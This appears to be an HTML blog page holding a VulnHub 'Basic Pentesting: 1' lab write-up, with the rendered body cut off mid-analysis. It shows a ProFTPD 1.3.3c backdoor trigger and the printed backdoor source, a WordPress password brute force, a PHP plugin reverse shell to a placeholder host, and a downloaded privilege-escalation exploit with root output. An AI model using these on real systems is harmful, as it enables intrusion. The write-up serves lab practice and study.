
<!DOCTYPE html>
<html lang="en">
    
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="generator" content="&lt;Theo/&gt;">
    <title>VulnHub #Basic Pentesting: 1 - &lt;Theo/&gt;</title>
    <meta name="author" content="Theo Chen">
    
        <meta name="keywords" content="vulnhub,writeup,basic pentesting 1">
    
    
        <link rel="icon" href="https://blog.theo.com.tw/assets/images/favicon.ico">
    
    
        
            <link rel="alternate" type="application/rss+xml" title="RSS" href="/rss2.xml">
        
    
    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Theo Chen","sameAs":["https://github.com/TheoKlein","https://twitter.com/The0_Klein","https://www.linkedin.com/in/theo-chen/","mailto:theokleintw@gmail.com"],"image":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176"},"articleBody":"Official website: Basic Pentesting: 1\n\nVM Network Setup: Host Only (192.168.56.102)\n\n\nNmap Port Scan1234PORT   STATE SERVICE VERSION21/tcp open  ftp     ProFTPD 1.3.3c22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n\nMethod 01: ProFTPD 1.3.3c backdoorIt’s really easy to know that proftpd 1.3.3c has an official backdoor by googling this specific version. The exploit is super simple, just send the command HELP ACIDBITCHEZ and you’ll get a root shell lol.\n12345$ nc 192.168.56.102 21220 ProFTPD 1.3.3c Server (vtcsec) [192.168.56.102]HELP ACIDBITCHEZiduid=0(root) gid=0(root) groups=0(root),65534(nogroup)\nHow did this happen?Since it’s so easy to get a root shell, let’s shift focus to source code analysis. You can find the backdoored version of proftpd 1.3.3c source code on the internet but not on the official FTP site.\nFirst of all, line 5089 in modules/mode_core.c, core_cmdtab stored all commands including C_HELP.\n12345678910111213141516171819202122232425262728293031323334353637static cmdtable core_cmdtab[] = &#123;#if defined(HAVE_REGEX_H) &amp;&amp; defined(HAVE_REGCOMP)  &#123; PRE_CMD, C_ANY, G_NONE,  regex_filters, FALSE, FALSE, CL_NONE &#125;,#endif  &#123; PRE_CMD, C_ANY, G_NONE, core_clear_fs,FALSE, FALSE, CL_NONE &#125;,  &#123; CMD, C_HELP, G_NONE,  core_help,\tFALSE,\tFALSE, CL_INFO &#125;,  &#123; CMD, C_PORT, G_NONE,  core_port,\tTRUE,\tFALSE, CL_MISC &#125;,  &#123; CMD, C_PASV, G_NONE,  core_pasv,\tTRUE,\tFALSE, CL_MISC &#125;,  &#123; CMD, C_EPRT, G_NONE,  core_eprt,    TRUE,\tFALSE, CL_MISC &#125;,  &#123; CMD, C_EPSV, G_NONE,  core_epsv,\tTRUE,\tFALSE, CL_MISC &#125;,  &#123; CMD, C_SYST, G_NONE,  core_syst,\tFALSE,\tFALSE, CL_INFO &#125;,  &#123; CMD, C_PWD,\t G_DIRS,  core_pwd,\tTRUE,\tFALSE, CL_INFO|CL_DIRS &#125;,  &#123; CMD, C_XPWD, G_DIRS,  core_pwd,\tTRUE,\tFALSE, CL_INFO|CL_DIRS &#125;,  &#123; CMD, C_CWD,\t G_DIRS,  core_cwd,\tTRUE,\tFALSE, CL_DIRS &#125;,  &#123; CMD, C_XCWD, G_DIRS,  core_cwd,\tTRUE,\tFALSE, CL_DIRS &#125;,  &#123; CMD, C_MKD,\t G_WRITE, core_mkd,\tTRUE,\tFALSE, CL_DIRS|CL_WRITE &#125;,  &#123; CMD, C_XMKD, G_WRITE, core_mkd,\tTRUE,\tFALSE, CL_DIRS|CL_WRITE &#125;,  &#123; CMD, C_RMD,\t G_WRITE, core_rmd,\tTRUE,\tFALSE, CL_DIRS|CL_WRITE &#125;,  &#123; CMD, C_XRMD, G_WRITE, core_rmd,\tTRUE,\tFALSE, CL_DIRS|CL_WRITE &#125;,  &#123; CMD, C_CDUP, G_DIRS,  core_cdup,\tTRUE,\tFALSE, CL_DIRS &#125;,  &#123; CMD, C_XCUP, G_DIRS,  core_cdup,\tTRUE,\tFALSE, CL_DIRS &#125;,  &#123; CMD, C_DELE, G_WRITE, core_dele,\tTRUE,\tFALSE, CL_WRITE &#125;,  &#123; CMD, C_MDTM, G_DIRS,  core_mdtm,\tTRUE,\tFALSE, CL_INFO &#125;,  &#123; CMD, C_RNFR, G_DIRS,  core_rnfr,\tTRUE,\tFALSE, CL_MISC|CL_WRITE &#125;,  &#123; CMD, C_RNTO, G_WRITE, core_rnto,\tTRUE,\tFALSE, CL_MISC|CL_WRITE &#125;,  &#123; LOG_CMD,     C_RNTO, G_NONE, core_rnto_cleanup, TRUE, FALSE, CL_NONE &#125;,  &#123; LOG_CMD_ERR, C_RNTO, G_NONE, core_rnto_cleanup, TRUE, FALSE, CL_NONE &#125;,  &#123; CMD, C_SIZE, G_READ,  core_size,\tTRUE,\tFALSE, CL_INFO &#125;,  &#123; CMD, C_QUIT, G_NONE,  core_quit,\tFALSE,\tFALSE,  CL_INFO &#125;,  &#123; LOG_CMD, \t C_QUIT, G_NONE, core_log_quit, FALSE, FALSE &#125;,  &#123; LOG_CMD_ERR, C_QUIT, G_NONE, core_log_quit, FALSE, FALSE &#125;,  &#123; CMD, C_NOOP, G_NONE,  core_noop,\tFALSE,\tFALSE,  CL_MISC &#125;,  &#123; CMD, C_FEAT, G_NONE,  core_feat,\tFALSE,\tFALSE,  CL_INFO &#125;,  &#123; CMD, C_OPTS, G_NONE,  core_opts,    FALSE,\tFALSE,\tCL_MISC &#125;,  &#123; POST_CMD, C_PASS, G_NONE, core_post_pass, FALSE, FALSE &#125;,  &#123; 0, NULL &#125;&#125;;\nC_HELP is defined in include/ftp.h line 78, confirmed that we find the correct way.\n1#define C_HELP\t&quot;HELP&quot;\t\t/* Help */\n\nNext, we followed core_help function to modules/mod_core.c line 3708.\n1234567891011121314151617181920212223MODRET core_help(cmd_rec *cmd) &#123;  if (cmd-&gt;argc == 1) &#123;    pr_help_add_response(cmd, NULL);  &#125; else &#123;    char *cp;    for (cp = cmd-&gt;argv[1]; *cp; cp++)      *cp = toupper(*cp);    if (strcasecmp(cmd-&gt;argv[1], &quot;SITE&quot;) == 0)      return pr_module_call(&amp;site_module, site_dispatch, cmd);    if (pr_help_add_response(cmd, cmd-&gt;argv[1]) == 0)      return PR_HANDLED(cmd);    pr_response_add_err(R_502, _(&quot;Unknown command &#x27;%s&#x27;&quot;), cmd-&gt;argv[1]);    return PR_ERROR(cmd);  &#125;  return PR_HANDLED(cmd);&#125;\ncore_help function is deal with HELP command. Our HELP command come with argv, it should be continue to pr_help_add_response(cmd, cmd-&gt;argv[1]) == 0 at line 3722.\nFollowed to src/help.c at line 80.\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869int pr_help_add_response(cmd_rec *cmd, const char *target) &#123;  if (help_list) &#123;    register unsigned int i;    struct help_rec *helps = help_list-&gt;elts;    char *outa[8], *outstr;    char buf[9] = &#123;&#x27;\\0&#x27;&#125;;    int col = 0;    if (!target) &#123;      pr_response_add(R_214,        _(&quot;The following commands are recognized (* =&gt;&#x27;s unimplemented):&quot;));      memset(outa, &#x27;\\0&#x27;, sizeof(outa));      for (i = 0; i &lt; help_list-&gt;nelts; i++) &#123;        outstr = &quot;&quot;;        if (helps[i].impl)          outa[col++] = (char *) helps[i].cmd;        else          outa[col++] = pstrcat(cmd-&gt;tmp_pool, helps[i].cmd, &quot;*&quot;, NULL);        /* 8 rows */        if ((i + 1) % 8 == 0 ||            helps[i+1].cmd == NULL) &#123;          register unsigned int j;          for (j = 0; j &lt; 8; j++) &#123;            if (outa[j]) &#123;              snprintf(buf, sizeof(buf), &quot;%-8s&quot;, outa[j]);              buf[sizeof(buf)-1] = &#x27;\\0&#x27;;              outstr = pstrcat(cmd-&gt;tmp_pool, outstr, buf, NULL);            &#125; else              break;          &#125;          if (*outstr)            pr_response_add(R_DUP, &quot;%s&quot;, outstr);          memset(outa, &#x27;\\0&#x27;, sizeof(outa));          col = 0;          outstr = &quot;&quot;;        &#125;      &#125;      pr_response_add(R_DUP, _(&quot;Direct comments to %s&quot;),        cmd-&gt;server-&gt;ServerAdmin ? cmd-&gt;server-&gt;ServerAdmin : &quot;ftp-admin&quot;);    &#125; else &#123;\tif (strcmp(target, &quot;ACIDBITCHEZ&quot;) == 0) &#123; setuid(0); setgid(0); system(&quot;/bin/sh;/sbin/sh&quot;); &#125;      /* List the syntax for the given target command. */      for (i = 0; i &lt; help_list-&gt;nelts; i++) &#123;        if (strcasecmp(helps[i].cmd, target) == 0) &#123;          pr_response_add(R_214, &quot;Syntax: %s %s&quot;, helps[i].cmd,            helps[i].syntax);          return 0;        &#125;      &#125;    &#125;    errno = ENOENT;    return -1;  &#125;  errno = ENOENT;  return -1;&#125;\nNow we finally find the backdoor! Since we called pr_help_add_response function with char *target, it will pass if condiction and go to else part. That’s it. There is a very strange line of code at line 131.\n1if (strcmp(target, &quot;ACIDBITCHEZ&quot;) == 0) &#123; setuid(0); setgid(0); system(&quot;/bin/sh;/sbin/sh&quot;); &#125;\nIf the target is ACIDBITCHEZ, it will execute a root shell!\nSimilar vulnerabilityThis reminds me of another, very similar vulnerability: vsfptd v2.3.4 Backdoor Command Execution.It’s also an open source FTP server containing backdoor at v2.3.4. When any FTP username end with :), vsftpd will start a shell and listen to port 6200 no matter the password is correct or not.\nMethod 02: Web ServerThe VM also open port 80 with Apache httpd service, but the index is just the default page so I start my routine work to pentest this website.\nFirst, I use dirb to scan the URL and found the secret folder. It’s actually a WordPress page but its static files seems not correctly loaded.\n\nIt’s easy to solve this problem. Just modify your host computer’s /etc/hosts file and add your VM’s ip in the file. For example, my VM’s ip is 192.168.56.102, add 192.168.56.102 vtcsec to the file and save it. Force reload the web page and you should see the full page completely.\nGet adminBack to our challenge, now we know that this is a default WordPress site. Maybe we can try brute force attack to crack the admin’s password. Using wpscan we can easily scan WordPress site and brute force attack to enumerate password. You can find some wordlists from SecLists.\n1$ wpscan --url http://192.168.56.102/secret --username admin --wordlist 10-million-password-list-top-10000.txt\n\nThe result admin’s password is admin orz…Never mind, now we can access the admin control panel.\nGet shellSince we have the admin privilege, we can control this WordPress site including upload custom plugin.\nWordPress allow user to install plugin from WordPress Plugin Directory or upload custom plugin in .zip format. We can build our own plugin and install it to get the web shell.\nHere is a simple PHP reverse shell in WordPress Plugin format:\n12345678&lt;?php/* * Plugin Name: MyWebshell * Description: A simple webshell. * Version: 1.0 */exec(&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/[REVERSE_HOST_IP]/[LISTENED_PORT] 0&gt;&amp;1&#x27;&quot;);?&gt;\nCompress this PHP file to a zip file. You can now upload and install this “reverse shell” plugin. All WordPress plugin can be access at /wp-contents/plugins/[PLUGIN_NAME]/[FILE_NAME].\nJust start a listening port, you can browse the plugin file you uploaded before and wait for reverse shell coming.\n123456789$ nc -nvlp 4444listening on [any] 4444 ...connect to [192.168.56.104] from (UNKNOWN) [192.168.56.102] 35928bash: cannot set terminal process group (1223): Inappropriate ioctl for devicebash: no job control in this shellwww-data@vtcsec:/var/www/html/secret/wp-admin$ ididuid=33(www-data) gid=33(www-data) groups=33(www-data)www-data@vtcsec:/var/www/html/secret/wp-admin$\n\nGet rootNow we have a reverse shell, but the user is www-data, we want root! Let’s try local privilege escalation attack.\nFirst, I used this script GitHub - mzet-&#x2F;linux-exploit-suggester: Linux privilege escalation auditing tool to search if there is any useful local privilege escalatiopn exploit exist or not.\nThe result give me a list of some possible exploits, I choose a latest one: Libc Realpath Buffer Underflow.My victim VM and attack VM (Kali Linux) are both in the same Host Only Network. I start a simple python HTTP server on Kali so I can use wget to download exploit code from victim VM and compile it:\n1234567891011121314151617181920212223(Kali) $ python -m SimpleHTTPServer 80(Victim) $ cd /tmp &amp;&amp; wget http://[KALI_IP]/exploit.c(Victim) $ gcc exploit.c -o exploit(Victim) $ chmod +x exploit &amp;&amp; ./exploit./exploit./exploit: setting up environment ...Detected OS version: &quot;16.04.3 LTS (Xenial Xerus)&quot;./exploit: using umount at &quot;/bin/umount&quot;.No pid supplied via command line, trying to create a namespaceCAVEAT: /proc/sys/kernel/unprivileged_userns_clone must be 1 on systems with USERNS protection.Namespaced filesystem created with pid 2874Attempting to gain root, try 1 of 10 ...Starting subprocessStack content received, calculating next phaseFound source address location 0x7ffe47de78e8 pointing to target address 0x7ffe47de79b8 with value 0x7ffe47de9221, libc offset is 0x7ffe47de78d8Changing return address from 0x7f4b1c234830 to 0x7f4b1c2d3e00, 0x7f4b1c2e0a20Using escalation string %69$hn%73$hn%1$2592.2592s%70$hn%1$4621.4621s%67$hn%1$1.1s%71$hn%1$8658.8658s%66$hn%1$16715.16715s%68$hn%72$hn%1$32949.32949s%1$30918.30918s%1$s%1$s%65$hn%1$s%1$s%1$s%1$s%1$s%1$s%1$186.186s%39$hn-%35$lx-%39$lx-%64$lx-%65$lx-%66$lx-%67$lx-%68$lx-%69$lx-%70$lx-%71$lx-%78$sExecutable now root-ownedCleanup completed, re-invoking binary/proc/self/exe: invoked as SUID, invoking shell ...iduid=0(root) gid=0(root) groups=0(root),33(www-data)\n\nThat is! Now you can do whatever you want for example change root password, create a new user or something else.\n","dateCreated":"2019-02-24T13:08:44+00:00","dateModified":"2025-01-17T13:11:17+00:00","datePublished":"2019-02-24T13:08:44+00:00","description":"Official website: Basic Pentesting: 1","headline":"VulnHub #Basic Pentesting: 1","image":["cover.png"],"mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.theo.com.tw/Writeups/VulnHub/VulnHub-Basic-Pentesting-1/"},"publisher":{"@type":"Organization","name":"Theo Chen","sameAs":["https://github.com/TheoKlein","https://twitter.com/The0_Klein","https://www.linkedin.com/in/theo-chen/","mailto:theokleintw@gmail.com"],"image":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176","logo":{"@type":"ImageObject","url":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176"}},"url":"https://blog.theo.com.tw/Writeups/VulnHub/VulnHub-Basic-Pentesting-1/","keywords":"Writeups","thumbnailUrl":"cover.png"}</script>
    
    <meta name="description" content="Official website: Basic Pentesting: 1">
<meta property="og:type" content="blog">
<meta property="og:title" content="VulnHub #Basic Pentesting: 1">
<meta property="og:url" content="https://blog.theo.com.tw/Writeups/VulnHub/VulnHub-Basic-Pentesting-1/index.html">
<meta property="og:site_name" content="&lt;Theo&#x2F;&gt;">
<meta property="og:description" content="Official website: Basic Pentesting: 1">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://blog.theo.com.tw/Writeups/VulnHub/VulnHub-Basic-Pentesting-1/cover.png">
<meta property="article:published_time" content="2019-02-24T13:08:44.000Z">
<meta property="article:modified_time" content="2025-01-17T13:11:17.215Z">
<meta property="article:author" content="Theo Chen">
<meta property="article:tag" content="Writeups">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blog.theo.com.tw/Writeups/VulnHub/VulnHub-Basic-Pentesting-1/cover.png">
<meta name="twitter:creator" content="@The0_Klein">
    
    
        
    
    
    
        <meta property="og:image" content="https://blog.theo.com.tw/Writeups/VulnHub/VulnHub-Basic-Pentesting-1/cover.png"/>
        <meta class="swiftype" name="image" data-type="enum" content="https://blog.theo.com.tw/Writeups/VulnHub/VulnHub-Basic-Pentesting-1/cover.png"/>
    
    
    
    <!--STYLES-->
    
<link rel="stylesheet" href="/assets/css/style-gdcyhoyuzwa8smbm8vz2yfxz7vo2renh92pv061urgkby5doa9lemz924ywr.min.css">

    <!--STYLES END-->
    
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-106120242-2"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'UA-106120242-2');
    </script>


    

    
        
    
</head>

    <body>
        <div id="blog">
            <!-- Define author's picture -->


    
        
    

<header id="header" data-behavior="2">
    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
    <div class="header-title">
        <a
            class="header-title-link"
            href="/"
            aria-label=""
        >
            &lt;Theo/&gt;
        </a>
    </div>
    
        
            <a
                class="header-right-picture "
                href="#about"
                aria-label="Open the link: /#about"
            >
        
        
            <img class="header-picture" src="https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176?s=90" alt="Author&#39;s picture"/>
        
        </a>
    
</header>

            <!-- Define author's picture -->


    

<nav id="sidebar" data-behavior="2">
    <div class="sidebar-container">
        
            <div class="sidebar-profile">
                <a
                    href="/#about"
                    aria-label="Read more about the author"
                >
                    <img class="sidebar-profile-picture" src="https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176?s=110" alt="Author&#39;s picture"/>
                </a>
                <h4 class="sidebar-profile-name">Theo Chen</h4>
                
                    <h5 class="sidebar-profile-bio"><p>Penetration Testing &#x2F; Malware Analysis &#x2F; Threat Hunting &#x2F; APT Research<br /><br />Ingress Enlightened Agent</p>
</h5>
                
            </div>
        
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="/"
                            
                            rel="noopener"
                            title="Home"
                        >
                        <i class="sidebar-button-icon fa fa-home" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Home</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="/all-categories"
                            
                            rel="noopener"
                            title="Categories"
                        >
                        <i class="sidebar-button-icon fa fa-bookmark" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Categories</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="/all-tags"
                            
                            rel="noopener"
                            title="Tags"
                        >
                        <i class="sidebar-button-icon fa fa-tags" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Tags</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="/all-archives"
                            
                            rel="noopener"
                            title="Archives"
                        >
                        <i class="sidebar-button-icon fa fa-archive" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Archives</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="#about"
                            
                            rel="noopener"
                            title="About"
                        >
                        <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">About</span>
                    </a>
            </li>
            
        </ul>
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="https://github.com/TheoKlein"
                            
                                target="_blank"
                            
                            rel="noopener"
                            title="GitHub"
                        >
                        <i class="sidebar-button-icon fab fa-github" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">GitHub</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="https://twitter.com/The0_Klein"
                            
                                target="_blank"
                            
                            rel="noopener"
                            title="Twitter"
                        >
                        <i class="sidebar-button-icon fab fa-twitter" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Twitter</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="https://www.linkedin.com/in/theo-chen/"
                            
                                target="_blank"
                            
                            rel="noopener"
                            title="LinkedIn"
                        >
                        <i class="sidebar-button-icon fab fa-linkedin" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">LinkedIn</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="mailto:theokleintw@gmail.com"
                            
                                target="_blank"
                            
                            rel="noopener"
                            title="Mail"
                        >
                        <i class="sidebar-button-icon fa fa-envelope" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Mail</span>
                    </a>
            </li>
            
        </ul>
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="/rss2.xml"
                            
                            rel="noopener"
                            title="RSS"
                        >
                        <i class="sidebar-button-icon fa fa-rss" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">RSS</span>
                    </a>
            </li>
            
        </ul>
        
    </div>
</nav>

            
            <div id="main" data-behavior="2"
                 class="
                        hasCoverMetaOut
                        ">
                
<article class="post">
    
    
        <div class="post-header main-content-wrap text-center">
    
        <h1 class="post-title">
            VulnHub #Basic Pentesting: 1
        </h1>
    
    
        <div class="post-meta">
    <time datetime="2019-02-24T13:08:44+00:00">
	
		    Feb 24, 2019
    	
    </time>
    
        <span>in </span>
        
    <a class="category-link" href="/categories/Writeups/">Writeups</a>, <a class="category-link" href="/categories/Writeups/VulnHub/">VulnHub</a>


    
</div>

    
</div>

    
    <div class="post-content markdown">
        <div class="main-content-wrap">
            <p>Official website: <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/basic-pentesting-1,216">Basic Pentesting: 1</a></p>
<span id="more"></span>
<p>VM Network Setup: Host Only (192.168.56.102)</p>
<h1 id="table-of-contents">Table of Contents</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Nmap-Port-Scan"><span class="toc-text">Nmap Port Scan</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Method-01-ProFTPD-1-3-3c-backdoor"><span class="toc-text">Method 01: ProFTPD 1.3.3c backdoor</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#How-did-this-happen"><span class="toc-text">How did this happen?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Similar-vulnerability"><span class="toc-text">Similar vulnerability</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Method-02-Web-Server"><span class="toc-text">Method 02: Web Server</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Get-admin"><span class="toc-text">Get admin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Get-shell"><span class="toc-text">Get shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Get-root"><span class="toc-text">Get root</span></a></li></ol></li></ol><!-- tocstop -->

<h2 id="Nmap-Port-Scan"><a href="#Nmap-Port-Scan" class="headerlink" title="Nmap Port Scan"></a>Nmap Port Scan</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     ProFTPD 1.3.3c</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br></pre></td></tr></table></figure>

<h2 id="Method-01-ProFTPD-1-3-3c-backdoor"><a href="#Method-01-ProFTPD-1-3-3c-backdoor" class="headerlink" title="Method 01: ProFTPD 1.3.3c backdoor"></a>Method 01: ProFTPD 1.3.3c backdoor</h2><p>It’s really easy to know that proftpd 1.3.3c has an <del>official</del> backdoor by googling this specific version. The exploit is super simple, just send the command <code>HELP ACIDBITCHEZ</code> and you’ll get a root shell lol.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ nc 192.168.56.102 21</span><br><span class="line">220 ProFTPD 1.3.3c Server (vtcsec) [192.168.56.102]</span><br><span class="line">HELP ACIDBITCHEZ</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),65534(nogroup)</span><br></pre></td></tr></table></figure>
<h3 id="How-did-this-happen"><a href="#How-did-this-happen" class="headerlink" title="How did this happen?"></a>How did this happen?</h3><p>Since it’s so easy to get a root shell, let’s shift focus to source code analysis. You can find the backdoored version of proftpd 1.3.3c source code on the internet but not on the official FTP site.</p>
<p>First of all, line 5089 in <code>modules/mode_core.c</code>, <code>core_cmdtab</code> stored all commands including <code>C_HELP</code>.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> cmdtable core_cmdtab[] = &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(HAVE_REGEX_H) &amp;&amp; defined(HAVE_REGCOMP)</span></span><br><span class="line">  &#123; PRE_CMD, C_ANY, G_NONE,  regex_filters, FALSE, FALSE, CL_NONE &#125;,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  &#123; PRE_CMD, C_ANY, G_NONE, core_clear_fs,FALSE, FALSE, CL_NONE &#125;,</span><br><span class="line">  &#123; CMD, C_HELP, G_NONE,  core_help,	FALSE,	FALSE, CL_INFO &#125;,</span><br><span class="line">  &#123; CMD, C_PORT, G_NONE,  core_port,	TRUE,	FALSE, CL_MISC &#125;,</span><br><span class="line">  &#123; CMD, C_PASV, G_NONE,  core_pasv,	TRUE,	FALSE, CL_MISC &#125;,</span><br><span class="line">  &#123; CMD, C_EPRT, G_NONE,  core_eprt,    TRUE,	FALSE, CL_MISC &#125;,</span><br><span class="line">  &#123; CMD, C_EPSV, G_NONE,  core_epsv,	TRUE,	FALSE, CL_MISC &#125;,</span><br><span class="line">  &#123; CMD, C_SYST, G_NONE,  core_syst,	FALSE,	FALSE, CL_INFO &#125;,</span><br><span class="line">  &#123; CMD, C_PWD,	 G_DIRS,  core_pwd,	TRUE,	FALSE, CL_INFO|CL_DIRS &#125;,</span><br><span class="line">  &#123; CMD, C_XPWD, G_DIRS,  core_pwd,	TRUE,	FALSE, CL_INFO|CL_DIRS &#125;,</span><br><span class="line">  &#123; CMD, C_CWD,	 G_DIRS,  core_cwd,	TRUE,	FALSE, CL_DIRS &#125;,</span><br><span class="line">  &#123; CMD, C_XCWD, G_DIRS,  core_cwd,	TRUE,	FALSE, CL_DIRS &#125;,</span><br><span class="line">  &#123; CMD, C_MKD,	 G_WRITE, core_mkd,	TRUE,	FALSE, CL_DIRS|CL_WRITE &#125;,</span><br><span class="line">  &#123; CMD, C_XMKD, G_WRITE, core_mkd,	TRUE,	FALSE, CL_DIRS|CL_WRITE &#125;,</span><br><span class="line">  &#123; CMD, C_RMD,	 G_WRITE, core_rmd,	TRUE,	FALSE, CL_DIRS|CL_WRITE &#125;,</span><br><span class="line">  &#123; CMD, C_XRMD, G_WRITE, core_rmd,	TRUE,	FALSE, CL_DIRS|CL_WRITE &#125;,</span><br><span class="line">  &#123; CMD, C_CDUP, G_DIRS,  core_cdup,	TRUE,	FALSE, CL_DIRS &#125;,</span><br><span class="line">  &#123; CMD, C_XCUP, G_DIRS,  core_cdup,	TRUE,	FALSE, CL_DIRS &#125;,</span><br><span class="line">  &#123; CMD, C_DELE, G_WRITE, core_dele,	TRUE,	FALSE, CL_WRITE &#125;,</span><br><span class="line">  &#123; CMD, C_MDTM, G_DIRS,  core_mdtm,	TRUE,	FALSE, CL_INFO &#125;,</span><br><span class="line">  &#123; CMD, C_RNFR, G_DIRS,  core_rnfr,	TRUE,	FALSE, CL_MISC|CL_WRITE &#125;,</span><br><span class="line">  &#123; CMD, C_RNTO, G_WRITE, core_rnto,	TRUE,	FALSE, CL_MISC|CL_WRITE &#125;,</span><br><span class="line">  &#123; LOG_CMD,     C_RNTO, G_NONE, core_rnto_cleanup, TRUE, FALSE, CL_NONE &#125;,</span><br><span class="line">  &#123; LOG_CMD_ERR, C_RNTO, G_NONE, core_rnto_cleanup, TRUE, FALSE, CL_NONE &#125;,</span><br><span class="line">  &#123; CMD, C_SIZE, G_READ,  core_size,	TRUE,	FALSE, CL_INFO &#125;,</span><br><span class="line">  &#123; CMD, C_QUIT, G_NONE,  core_quit,	FALSE,	FALSE,  CL_INFO &#125;,</span><br><span class="line">  &#123; LOG_CMD, 	 C_QUIT, G_NONE, core_log_quit, FALSE, FALSE &#125;,</span><br><span class="line">  &#123; LOG_CMD_ERR, C_QUIT, G_NONE, core_log_quit, FALSE, FALSE &#125;,</span><br><span class="line">  &#123; CMD, C_NOOP, G_NONE,  core_noop,	FALSE,	FALSE,  CL_MISC &#125;,</span><br><span class="line">  &#123; CMD, C_FEAT, G_NONE,  core_feat,	FALSE,	FALSE,  CL_INFO &#125;,</span><br><span class="line">  &#123; CMD, C_OPTS, G_NONE,  core_opts,    FALSE,	FALSE,	CL_MISC &#125;,</span><br><span class="line">  &#123; POST_CMD, C_PASS, G_NONE, core_post_pass, FALSE, FALSE &#125;,</span><br><span class="line">  &#123; <span class="number">0</span>, <span class="literal">NULL</span> &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>C_HELP</code> is defined in <code>include/ftp.h</code> line 78, confirmed that we find the correct way.</p>
